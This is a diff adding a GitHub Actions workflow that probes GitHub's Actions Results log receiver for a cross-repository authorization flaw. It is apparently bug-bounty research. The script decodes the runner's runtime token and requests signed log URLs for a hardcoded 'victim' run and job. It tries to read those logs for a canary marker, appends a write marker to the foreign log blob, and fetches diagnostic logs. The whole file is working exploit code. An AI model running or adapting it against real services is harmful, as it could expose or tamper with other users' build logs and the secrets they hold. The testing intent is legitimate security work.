@@ -1,0 +1,219 @@
+name: GHBB public Results log receiver pull request probe
+
+on:
+  pull_request:
+    branches: [main]
+    types: [synchronize, reopened]
+
+permissions:
+  contents: read
+  issues: write
+  pull-requests: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    env:
+      VICTIM_RUN_BACKEND_ID: e40710a1-021c-4829-b2f1-3525b7493c1c
+      VICTIM_JOB_BACKEND_ID: 30ad3e4e-048d-50ff-b6c3-a4bf3c7a3315
+      VICTIM_MARKER: ghbb-results-service-victim-context-20260726
+    steps:
+      - name: Test Results receiver job-log authorization with exact canaries
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const crypto = require('crypto')
+            const token = process.env.ACTIONS_RUNTIME_TOKEN || ''
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL || ''
+            const victimRun = process.env.VICTIM_RUN_BACKEND_ID
+            const victimJob = process.env.VICTIM_JOB_BACKEND_ID
+            const victimMarker = process.env.VICTIM_MARKER
+            if (!token || !resultsUrl) throw new Error('Actions Results runtime context unavailable')
+
+            const parts = token.split('.')
+            if (parts.length < 3) throw new Error('Runtime token is not a JWT')
+            const payload = parts[1] + '='.repeat((4 - parts[1].length % 4) % 4)
+            const claims = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'))
+            const scopeMatch = /(?:^| )Actions\.Results:([^: ]+):([^ ]+)/.exec(claims.scp || '')
+            if (!scopeMatch) throw new Error('Actions.Results scope unavailable')
+            const ownRun = scopeMatch[1]
+            const ownJob = scopeMatch[2]
+
+            const base = resultsUrl.endsWith('/') ? resultsUrl : `${resultsUrl}/`
+            const receiver = `${base}twirp/results.services.receiver.Receiver`
+            const state = {
+              runtime_context_valid: true,
+              positive_http: 0,
+              positive_url: false,
+              positive_blob_type: '<none>',
+              positive_sas_permissions: '<none>',
+              positive_get_http: 0,
+              positive_get_bytes: 0,
+              foreign_http: 0,
+              foreign_url: false,
+              foreign_blob_type: '<none>',
+              foreign_sas_permissions: '<none>',
+              foreign_get_http: 0,
+              foreign_get_bytes: 0,
+              foreign_exact_marker_read: false,
+              foreign_append_http: 0,
+              foreign_append_succeeded: false,
+              foreign_metadata_http: 0,
+              foreign_metadata_ok: false,
+              diagnostic_http: 0,
+              diagnostic_url: false,
+              diagnostic_get_http: 0,
+              diagnostic_get_bytes: 0,
+              harness_valid: false,
+              authorization_boundary_failure: false,
+              write_marker: `GHBB-CROSS-REPO-JOB-LOG-WRITE-${context.runId}`,
+              failure: '<none>'
+            }
+
+            async function post(method, body) {
+              try {
+                const response = await fetch(`${receiver}/${method}`, {
+                  method: 'POST',
+                  headers: {
+                    authorization: `Bearer ${token}`,
+                    accept: 'application/json',
+                    'content-type': 'application/json'
+                  },
+                  body: JSON.stringify(body),
+                  signal: AbortSignal.timeout(20000)
+                })
+                const text = await response.text()
+                let json = null
+                try { json = text ? JSON.parse(text) : {} } catch (_) {}
+                return {status: response.status, json}
+              } catch (_) {
+                return {status: 0, json: null}
+              }
+            }
+
+            function urlData(raw) {
+              if (!raw) return {present: false, permissions: '<none>'}
+              core.setSecret(raw)
+              try {
+                const parsed = new URL(raw)
+                return {present: true, permissions: parsed.searchParams.get('sp') || '<absent>'}
+              } catch (_) {
+                return {present: true, permissions: '<parse-failed>'}
+              }
+            }
+
+            async function boundedGet(raw) {
+              if (!raw) return {status: 0, bytes: Buffer.alloc(0)}
+              core.setSecret(raw)
+              try {
+                const response = await fetch(raw, {
+                  method: 'GET',
+                  headers: {range: 'bytes=0-524287'},
+                  signal: AbortSignal.timeout(20000)
+                })
+                const bytes = response.status === 200 || response.status === 206
+                  ? Buffer.from(await response.arrayBuffer())
+                  : Buffer.alloc(0)
+                return {status: response.status, bytes}
+              } catch (_) {
+                return {status: 0, bytes: Buffer.alloc(0)}
+              }
+            }
+
+            try {
+              const positive = await post('GetJobLogsSignedBlobURL', {
+                workflow_run_backend_id: ownRun,
+                workflow_job_run_backend_id: ownJob
+              })
+              const positiveUrl = positive.json?.logs_url || positive.json?.logsUrl || ''
+              const positiveInfo = urlData(positiveUrl)
+              const positiveGet = await boundedGet(positiveUrl)
+              state.positive_http = positive.status
+              state.positive_url = positiveInfo.present
+              state.positive_blob_type = positive.json?.blob_storage_type || positive.json?.blobStorageType || '<none>'
+              state.positive_sas_permissions = positiveInfo.permissions
+              state.positive_get_http = positiveGet.status
+              state.positive_get_bytes = positiveGet.bytes.length
+              state.harness_valid = positive.status === 200 && positiveInfo.present
+
+              const foreign = await post('GetJobLogsSignedBlobURL', {
+                workflow_run_backend_id: victimRun,
+                workflow_job_run_backend_id: victimJob
+              })
+              const foreignUrl = foreign.json?.logs_url || foreign.json?.logsUrl || ''
+              const foreignInfo = urlData(foreignUrl)
+              const foreignGet = await boundedGet(foreignUrl)
+              state.foreign_http = foreign.status
+              state.foreign_url = foreignInfo.present
+              state.foreign_blob_type = foreign.json?.blob_storage_type || foreign.json?.blobStorageType || '<none>'
+              state.foreign_sas_permissions = foreignInfo.permissions
+              state.foreign_get_http = foreignGet.status
+              state.foreign_get_bytes = foreignGet.bytes.length
+              state.foreign_exact_marker_read = foreignGet.bytes.toString('utf8').includes(victimMarker)
+
+              if (foreignUrl) {
+                const appendBytes = Buffer.from(`${state.write_marker}\n`)
+                try {
+                  const separator = foreignUrl.includes('?') ? '&' : '?'
+                  const appendResponse = await fetch(`${foreignUrl}${separator}comp=appendblock`, {
+                    method: 'PUT',
+                    headers: {
+                      'x-ms-version': '2021-12-02',
+                      'content-type': 'text/plain',
+                      'content-length': String(appendBytes.length)
+                    },
+                    body: appendBytes,
+                    signal: AbortSignal.timeout(20000)
+                  })
+                  state.foreign_append_http = appendResponse.status
+                  state.foreign_append_succeeded = appendResponse.status >= 200 && appendResponse.status < 300
+                } catch (_) {}
+              }
+
+              if (state.foreign_append_succeeded) {
+                const metadata = await post('CreateJobLogsMetadata', {
+                  workflow_run_backend_id: victimRun,
+                  workflow_job_run_backend_id: victimJob,
+                  uploaded_at: new Date().toISOString(),
+                  line_count: 1
+                })
+                state.foreign_metadata_http = metadata.status
+                state.foreign_metadata_ok = metadata.json?.ok === true
+              }
+
+              const diagnostic = await post('GetJobDiagLogsSignedBlobURL', {
+                workflow_run_backend_id: victimRun,
+                workflow_job_run_backend_id: victimJob
+              })
+              const diagnosticUrl = diagnostic.json?.diag_logs_url || diagnostic.json?.diagLogsURL || diagnostic.json?.diagLogsUrl || ''
+              const diagnosticGet = await boundedGet(diagnosticUrl)
+              state.diagnostic_http = diagnostic.status
+              state.diagnostic_url = Boolean(diagnosticUrl)
+              state.diagnostic_get_http = diagnosticGet.status
+              state.diagnostic_get_bytes = diagnosticGet.bytes.length
+
+              state.authorization_boundary_failure = state.foreign_exact_marker_read || state.foreign_append_succeeded
+            } catch (error) {
+              state.failure = String(error?.message || 'other').replace(/[^A-Za-z0-9_.-]/g, '_').slice(0, 120)
+            }
+
+            const safeState = {...state}
+            safeState.write_marker_sha256 = crypto.createHash('sha256').update(state.write_marker).digest('hex')
+            delete safeState.write_marker
+            const body = [
+              '<!-- ghbb-results-log-pr-boundary-result -->',
+              `GHBB Results receiver pull_request log-boundary result for run ${context.runId}:`,
+              ...Object.entries(safeState).map(([name, value]) => `- ${name}: \`${value}\``),
+              '- runtime_token_or_signed_url_exposed: `false`'
+            ].join('\n')
+            await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: context.issue.number,
+              body
+            })
+
+            if (!state.harness_valid) core.setFailed('Results job-log positive-control harness invalid')
+            else if (state.authorization_boundary_failure) core.setFailed('CONFIRMED_RESULTS_JOB_LOG_AUTHORIZATION_BOUNDARY_FAILURE')
+            else console.log('RESULT=RESULTS_JOB_LOG_BOUNDARY_DENIED_EXPECTED')
